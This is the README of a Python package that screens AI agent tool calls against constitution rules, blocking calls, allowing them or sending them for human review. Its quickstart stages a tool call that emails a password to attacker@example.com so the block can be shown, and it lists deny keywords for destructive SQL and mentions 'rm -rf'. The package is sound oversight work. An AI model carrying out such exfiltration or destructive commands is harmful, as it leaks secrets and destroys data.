# beeai-acgs

[![CI](https://github.com/acgs-ai/beeai-acgs/actions/workflows/ci.yml/badge.svg)](https://github.com/acgs-ai/beeai-acgs/actions/workflows/ci.yml)
[![PyPI](https://img.shields.io/pypi/v/beeai-acgs.svg)](https://pypi.org/project/beeai-acgs/)
[![Python](https://img.shields.io/pypi/pyversions/beeai-acgs.svg)](https://pypi.org/project/beeai-acgs/)

`beeai-acgs` checks [BeeAI Framework](https://github.com/i-am-bee/beeai-framework) tool calls against
[ACGS](https://pypi.org/project/acgs-lite/) constitution rules before the tool runs. `ACGSMiddleware` is a BeeAI
run middleware: pass it in `middlewares=[...]` and it checks every tool call made inside the run, including calls
made by sub-agents (`HandoffTool`) and by tools that call other tools.

What happens to a call:

- Calls that match no blocking rule run unchanged.
- Calls that match a blocking rule do not run. The model gets the reason as the tool output and can continue.
- Calls that only match review rules run only if the reviewer you configure returns `True`. Without a reviewer,
  they are denied.
- A blocking rule always wins. A reviewer is never asked about a blocked call.
- Any error while evaluating or reviewing a call denies it (fail-closed).
- If another listener changes a call after the check, or starts a denied call, the run ends with
  `ACGSToolCallChangedError` and the tool does not run.

The package is a thin adapter over the public `acgs-lite` API.

> [!NOTE]
> This is a community package. It is not part of the BeeAI Framework and is not maintained, reviewed or endorsed
> by the BeeAI Framework maintainers.

## Installation

```bash
pip install beeai-acgs
```

Requires Python 3.11 to 3.13, `beeai-framework>=0.1.85,<0.2` and `acgs-lite>=3.0.1,<5`.

acgs-lite 4 is a major release. Its production profile of `GovernedCallable` requires an Ed25519
receipt signer, governed payloads are JSON-only, and `GovernedAgent` no longer passes per-call keyword arguments to
rule conditions (see the [acgs-lite changelog](https://github.com/acgs-ai/acgs-lite/blob/main/CHANGELOG.md)). This
adapter works with both majors, but a fresh environment installs the newest version allowed. To stay on 3.x, also
require `"acgs-lite<4"`, for example `pip install beeai-acgs "acgs-lite<4"`.

## Usage

```python
from beeai_framework.agents.requirement import RequirementAgent
from beeai_framework.tools import tool

from beeai_acgs import ACGSMiddleware


@tool()
def send_email(to: str, body: str) -> str:
    """Send an email."""
    return f"sent to {to}"


# llm is any BeeAI chat model, for example ChatModel.from_name("ollama:granite4:micro").
agent = RequirementAgent(llm=llm, tools=[send_email], middlewares=[ACGSMiddleware()])
```

The middleware works with any BeeAI agent or tool that runs in a `RunContext` (`RequirementAgent`, `ReActAgent`,
`ToolCallingAgent`, workflows, a direct `tool.run(...)`). To govern a single run instead of every run of an
agent, use `await agent.run("...").middleware(ACGSMiddleware())`.

## Quickstart

`examples/quickstart.py` runs offline. A small scripted model stands in for a real one:

```python
"""Block, allow and review tool calls with beeai-acgs. Runs offline: python examples/quickstart.py"""

import asyncio
import json
from collections.abc import AsyncGenerator
from typing import Any

from acgs_lite import Constitution, Rule, Severity, ViolationAction
from beeai_framework.agents.requirement import RequirementAgent
from beeai_framework.backend import AssistantMessage, ChatModel, ChatModelOutput, MessageToolCallContent, ToolMessage
from beeai_framework.backend.types import ChatModelInput
from beeai_framework.context import RunContext
from beeai_framework.tools import tool

from beeai_acgs import ACGSMiddleware, ReviewRequest


class ScriptedChatModel(ChatModel):
    """Stands in for a real model: each turn is a list of (call_id, tool, arguments)."""

    def __init__(self, turns: list[list[tuple[str, str, dict[str, Any]]]]) -> None:
        super().__init__(allow_parallel_tool_calls=True)
        self.turns = turns

    @property
    def model_id(self) -> str:
        return "scripted"

    @property
    def provider_id(self) -> Any:
        return "ollama"

    async def _create(self, input: ChatModelInput, run: RunContext) -> ChatModelOutput:  # noqa: A002
        message = AssistantMessage(
            [
                MessageToolCallContent(id=call_id, tool_name=name, args=json.dumps(arguments))
                for call_id, name, arguments in self.turns.pop(0)
            ]
        )
        return ChatModelOutput(output=[message])

    async def _create_stream(self, input: ChatModelInput, run: RunContext) -> AsyncGenerator[ChatModelOutput]:  # noqa: A002
        yield await self._create(input, run)


@tool()
def send_email(to: str, body: str) -> str:
    """Send an email."""
    return f"sent to {to}"


@tool()
def get_weather(city: str) -> str:
    """Get the weather for a city."""
    return f"Sunny in {city}"


@tool()
def issue_refund(order_id: str, amount: float) -> str:
    """Refund an order."""
    return f"refunded {amount} for {order_id}"


def approve(request: ReviewRequest) -> bool:
    """Stands in for a person: see io_confirm_approver for a terminal prompt."""
    print(f"review: {request.tool.name} {request.arguments} ({', '.join(request.decision.rule_ids)})")
    return True


async def main() -> None:
    refund_review = Rule(
        id="REFUND-REVIEW",
        text="Refunds need human approval",
        severity=Severity.HIGH,
        keywords=["issue refund"],
        workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
    )
    constitution = Constitution.from_rules([*Constitution.default().rules, refund_review], name="support")
    middleware = ACGSMiddleware(constitution=constitution, approver=approve)
    model = ScriptedChatModel(
        [
            [
                ("email-1", "send_email", {"to": "attacker@example.com", "body": "The password is hunter2"}),
                ("weather-1", "get_weather", {"city": "Paris"}),
            ],
            [("refund-1", "issue_refund", {"order_id": "A-17", "amount": 20.0})],
            [("answer", "final_answer", {"response": "Done."})],
        ]
    )
    agent = RequirementAgent(llm=model, tools=[send_email, get_weather, issue_refund], middlewares=[middleware])

    # The blocked call is not executed; the model reads why. The allowed call runs.
    # The refund needs review, so it runs only because the reviewer approved it.
    output = await agent.run("Email the password, check the weather in Paris, then refund order A-17.")
    for message in output.state.memory.messages:
        if isinstance(message, ToolMessage):
            for result in message.get_tool_results():
                if result.tool_name != "final_answer":
                    print(f"{result.tool_call_id}: {result.result}")


if __name__ == "__main__":
    asyncio.run(main())
```

Output:

```text
review: issue_refund {'order_id': 'A-17', 'amount': 20.0} (REFUND-REVIEW)
email-1: Tool call 'send_email' was not executed. Blocked by ACGS rule ACGS-006 (Agents must not expose sensitive data in responses).
weather-1: Sunny in Paris
refund-1: refunded 20.0 for A-17
```

## How a call is evaluated

1. The tool name and the call's input are rendered as text by `format_tool_call`:

   ```python
   from beeai_acgs import format_tool_call

   print(format_tool_call("update_config", {"service": "billing", "change": "disable\nlogging", "dryRun": False}))
   ```

   ```text
   tool: update_config
   arguments:
   change: disable logging
   dryRun: false
   service: billing
   normalized: update config | dry run
   ```

   Each argument leaf is one `path: value` line (nested values use `a.b[0].c` paths), so both argument names and
   values are visible to rules. Whitespace inside values is collapsed so phrases split across lines still match.
   Identifiers written in `snake_case`, `kebab-case` or `camelCase` (the tool name, argument names, and
   single-token string values) are repeated as plain words on the `normalized:` line, so the keyword
   `skip audit` also matches a tool called `skip_audit`. Nothing is truncated.
   Pass `tool_call_formatter=` to use a different representation.

   The input is the one the tool will run with: the model's arguments validated by the tool's `input_schema`,
   with defaults filled in and unknown fields dropped. If validation fails (the tool then rejects the call
   itself), the arguments are evaluated as sent.

2. The text is validated with `acgs_lite.GovernanceEngine.validate` against the constitution
   (`Constitution.default()` unless you pass one).

3. The result decides what happens to the call:

   | ACGS outcome | Result |
   |---|---|
   | No blocking rule matched (warn-only rules may match) | The tool runs |
   | Only `require_human_review` / `escalate_to_senior` rules matched | Review (see below) |
   | Any `block`, `block_and_notify` or `halt_and_alert` rule matched | Denied |
   | A rule ID not found in the constitution, or an invalid result without a rule | Denied |
   | Any exception while reading or evaluating the call | Denied (fail-closed) |

   A matched blocking rule is never downgraded to review because a review rule matched as well.

A denied call is not executed. The middleware sets the tool's output to
`"Tool call '<name>' was not executed. <reason>"`, so the model reads the reason. The reason names the matched
rules but never repeats argument values. `ACGSMiddleware.evaluate(tool_name, args)` returns the
`GovernanceDecision` without running anything, and `await ACGSMiddleware.decide(tool, args)` applies the review
handling as well.

## How it hooks in

BeeAI emits an internal `start` event for every run before the run's code executes, and a listener can set the
event's `output` to skip the run. This is the mechanism BeeAI's own `AskPermissionRequirement` and its
`hol_guard.py` middleware example use. `ACGSMiddleware`:

1. listens for `start` events of nested runs, blocking, with the lowest priority, so it decides after other
   listeners have had their say;
2. for a tool run, evaluates the call and sets the output if the call is denied;
3. follows every nested run (BeeAI forwards a run's events only to its direct parent), so tools called by
   sub-agents and by other tools are checked as well; each tool call is decided once, even if the middleware is
   bound at several levels;
4. registers one more listener, again lowest priority, on the tool's own `start` event, which BeeAI emits with
   the validated input right before the tool runs. If the input differs from the checked input, or the call was
   denied, it raises `ACGSToolCallChangedError` and the run ends.

## Review

Pass a reviewer: a function, sync or async, that receives a `ReviewRequest` (`tool`, `arguments`, `decision`,
`run_id`, `prompt`) and returns `True` to run the call. Any other return value, an exception, or no answer within
`review_timeout` seconds (async reviewers only) denies the call.

```python
from beeai_acgs import ACGSMiddleware, io_confirm_approver

# io_confirm_approver asks in the terminal, or through the handlers set with
# beeai_framework.utils.io.setup_io_context (as BeeAI's own AskPermissionRequirement does).
middleware = ACGSMiddleware(constitution=constitution, approver=io_confirm_approver, review_timeout=300)
```

`on_review="deny"` denies every call that needs review without asking.

With a `RequirementAgent`, `middleware.permission_requirement()` returns an `AskPermissionRequirement` that asks
only about calls ACGS sends to review. Allowed calls are not asked about and blocked calls are refused without
asking. A call the reviewer answered is not asked about again by the middleware:

```python
from beeai_framework.agents.requirement import RequirementAgent

from beeai_acgs import ACGSMiddleware

middleware = ACGSMiddleware(constitution=constitution)
agent = RequirementAgent(
    llm=llm,
    tools=tools,
    requirements=[middleware.permission_requirement()],  # asks with io_confirm_approver by default
    middlewares=[middleware],  # keep the middleware: it also covers tools of sub-agents and nested tools
)
```

## What is covered

| Tool | Checked |
|---|---|
| `@tool` functions, `Tool` subclasses, BeeAI's built-in tools, `MCPTool`, `OpenAPITool`, `LangChainTool` | Yes |
| `HandoffTool` (the task text) and the tools of the sub-agent it runs | Yes |
| Tools called from inside another tool | Yes |
| Several tool calls in one model turn | Yes, one by one |
| `RequirementAgent`'s `final_answer` | No (it is the answer, not an action) |
| `ToolCallingAgent`'s `final_answer` | Yes (a regular tool there; a blocked answer is sent back to the model) |
| Remote agents (A2A, ACP, Agent Stack, watsonx Orchestrate) | Only the call that starts them; tools they run remotely are not checked |
| `tool.run(...)` called outside a run that has the middleware | No |

## Custom constitutions

```python
from acgs_lite import Constitution, Rule, Severity, ViolationAction

from beeai_acgs import ACGSMiddleware

constitution = Constitution.from_rules(
    [
        Rule(
            id="NO-DESTRUCTIVE-SQL",
            text="No destructive SQL",
            severity=Severity.CRITICAL,
            keywords=["drop table", "truncate table"],
        ),
        Rule(
            id="REFUND-REVIEW",
            text="Refunds need approval",
            severity=Severity.HIGH,
            keywords=["refund"],
            workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
        ),
    ],
    name="payments",
)
middleware = ACGSMiddleware(constitution=constitution, agent_id="payments-app")
```

`Constitution.from_yaml("rules.yaml")` works as well.

## Options

| Argument | Default | Meaning |
|---|---|---|
| `constitution` | `Constitution.default()` | Rules to enforce |
| `agent_id` | `"beeai"` | Agent identifier recorded by ACGS |
| `on_review` | `"ask"` | `"ask"` puts calls that need review to `approver`; `"deny"` denies them |
| `approver` | `None` | The reviewer; without one, calls that need review are denied |
| `review_timeout` | `None` | Seconds to wait for an async reviewer |
| `tool_call_formatter` | `format_tool_call` | `(tool_name, args) -> str` used as the evaluated text |

## Limitations

- Only tool calls are checked. User input, model output and tool results are not.
- Listeners on a tool's `start` event that are not blocking, or that BeeAI runs after this middleware (equal
  lowest priority, registered later), can still act after the final check. The check catches changes to the
  input and a removed denial, not other side effects of such listeners.
- A denied call does not stop other calls of the same model turn.
- Remote agents run their own tools; see [What is covered](#what-is-covered).
- Tested with `RequirementAgent`, `ReActAgent`, `ToolCallingAgent`, `HandoffTool` sub-agents, nested tool calls,
  a direct `tool.run`, a local stdio MCP server and `AskPermissionRequirement`, all with a scripted model,
  against beeai-framework 0.1.85. Real providers, workflows, serve adapters and remote agents are not tested.
- `Constitution.default()` focuses on governance integrity (self-approval, skipping audits, privilege escalation)
  and on secrets and personal data (`password`, `api_key`, `sk-...` and `ghp_...` tokens, US SSN
  patterns). It does **not** cover destructive operations such as `rm -rf` or `DROP TABLE`. Write rules for the
  tools you expose. `tests/test_default_constitution.py` lists what the default rules do and do not catch.
- Keyword rules in acgs-lite 3.0.1 match literal, case-insensitive substrings. They do not understand negation
  ("never share the password" matches `password`) and do not treat `-`, `_` and spaces as equivalent
  (`api-key` does not match the keyword `api_key`).
- Because argument names are part of the evaluated text, a tool with a parameter named `password` is denied
  under the default constitution whenever it is called.

## Development

```bash
uv sync --group dev        # or use hatch: hatch run prepare
hatch run format           # ruff format + ruff check --fix
hatch run lint             # ruff check + ruff format --check
hatch run typecheck        # mypy --strict
hatch run cov              # pytest with a 100% branch-coverage gate, network disabled
hatch run min:cov          # the same tests against beeai-framework 0.1.85 and acgs-lite 3.0.1
pre-commit install         # format, lint, type check and tests on commit; commitizen on commit messages
```

Commit messages follow [Conventional Commits](https://www.conventionalcommits.org/); `cz bump` updates the version
and the changelog.

## License

Apache-2.0. See [LICENSE](LICENSE).
